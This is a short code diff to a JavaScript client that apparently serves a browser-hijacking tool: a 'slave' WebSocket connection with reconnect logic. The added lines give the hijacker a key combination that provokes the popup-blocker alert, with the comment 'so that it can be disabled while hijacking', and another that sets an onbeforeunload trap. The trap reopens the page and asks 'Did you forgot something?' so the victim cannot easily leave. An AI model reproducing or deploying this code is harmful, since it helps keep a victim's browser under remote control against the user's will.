@@ -5,11 +5,28 @@ var lastReconnectTries = 0;
 var timeoutId;
 var ws;
 
+
+// ALT+ENTER to make popup blocker alert
+// so that it can be disabled while hijacking
+document.addEventListener('keyup', function(event) {
+  if(event.altKey && event.keyCode === 13){
+    window.open();
+  }
+  if(event.shiftKey && event.altKey && event.keyCode === 13){
+    window.onbeforeunload = function(e){
+      window.open(location.href);
+      var msg = 'Did you forgot something?';
+      e = e || window.event;
+
+      return e ? e.returnValue : msg;
+    }
+  }
+});
 var slave = function() {
   ++reconnectTries;
   console.log('Connecting')
   ws = new WebSocket(wss);
-  
+
   ws.onopen = function(event) {
     clearTimeout(timeoutId);
     lastReconnectTries = reconnectTries;
